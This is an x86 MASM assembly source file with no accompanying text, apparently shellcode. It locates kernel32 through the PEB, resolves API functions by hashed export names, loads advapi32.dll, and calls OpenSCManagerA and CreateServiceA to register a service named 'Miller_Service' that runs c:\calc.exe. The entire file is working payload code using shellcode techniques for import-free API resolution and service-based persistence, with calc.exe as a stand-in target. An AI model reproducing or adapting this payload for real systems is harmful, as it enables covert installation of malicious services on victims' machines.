.586

.MODEL FLAT, STDCALL

OPTION casemap:none

.DATA

.CODE
   start:
       mov ebp, esp                    ;
       add esp, 0fffff9f0H             ;
   find_kernel32:
       xor ecx,ecx                     ;
       ASSUME FS:NOTHING               ;
       mov esi,fs:[ecx+30h]            ;
       mov esi,[esi+0Ch]               ;
       mov esi,[esi+1Ch]               ;
   next_module:
       mov ebx, [esi+8h]               ;
       mov edi, [esi+20h]              ;
       mov esi, [esi]                  ;
       cmp [edi+12*2], cx              ;
       jne next_module                 ;
   find_function_shorten:
       jmp find_function_shorten_bnc   ;
   find_function_ret:
       pop esi                         ;
       mov [ebp+4H], esi               ;
       jmp resolve_symbols_kernel32    ;
   find_function_shorten_bnc:
       call find_function_ret          ;
   find_function:
       pushad                          ;
       mov eax, [ebx+3ch]              ;
       mov edi, [ebx+eax+78h]          ;
       add edi, ebx                    ;
       mov ecx, [edi+18h]              ;
       mov eax, [edi+20h]              ;
       add eax, ebx                    ;
       mov [ebp-4], eax                ;
   find_function_loop:
       jecxz find_function_finished    ;
       dec ecx                         ;
       mov eax, [ebp-4]                ;
       mov esi, [eax+ecx*4]            ;
       add esi, ebx                    ;
   compute_hash:
       xor eax, eax                    ;
       cdq                             ;
       cld                             ;
   compute_hash_again:
       lodsb                           ;
       test al, al                     ;
       jz compute_hash_finished        ;
       ror edx, 0dH                    ;
       add edx, eax                    ;
       jmp compute_hash_again          ;
   compute_hash_finished:
   find_function_compare:
       cmp edx, [esp+24H]              ;
       jnz find_function_loop          ;
       mov edx, [edi+24H]              ;
       add edx, ebx                    ;
       mov cx, [edx+2*ecx]             ;
       mov edx, [edi+1cH]              ;
       add edx, ebx                    ;
       mov eax, [edx+4*ecx]            ;
       add eax, ebx                    ;
       mov [esp+1cH], eax              ;
   find_function_finished: 
       popad                           ;
       ret                             ;
   resolve_symbols_kernel32:
       push 78b5b983h
       call dword ptr [ebp+4h]         ;
       mov [ebp+10h], eax              ;Save TerminateProcess address for later

       push 0ec0e4e8eh
       call dword ptr [ebp+4h]         ;
       mov [ebp+14h], eax              ;Save LoadLibraryA address for later

       push 0C1634AF9h
       call dword ptr [ebp+4h]         ;
       mov [ebp+20h], eax              ;Save WideCharToMultiByte address for later

   load_Advapi32:
       push 0h
       push 6c6c642eh;
       push 32336970h;
       push 61766441h;
       push esp;
       call dword ptr [ebp+14h];
       mov ebx, eax                    ;Move the base address of Advapi32.dll to EBX

       push 0BE66D274h;
       call dword ptr [ebp+4h]        ;
       mov [ebp+18h], eax             ;Save OpenSCManagerA address for later

       push 9E112AD3h;
       call dword ptr [ebp+4h]        ;
       mov [ebp+1ch], eax             ;Save CreateServiceA address for later

       push 0F003Fh; SC_MANAGER_ALL_ACCESS (0xF003F)
       push 0;
       push 0;
       call dword ptr [ebp+18h]; EAX存放hSCManager         

       push 00006563h;
       push 69767265h;
       push 535f7265h;
       push 6c6c694dh;
       push esp;
       pop esi; Service名称

       push 00657865h;
       push 2e636c61h;
       push 635c3a63h;
       push esp;
       pop edi; c:\calc.exe

       push 0;
       push 0;
       push 0;
       push 0;
       push 0;
       push edi;
       push 1h;
       push 3h;
       push 10h;
       push 0F003Fh;
       push esi;
       push esi;
       push eax;
       call dword ptr [ebp+1ch];

   


 













end start
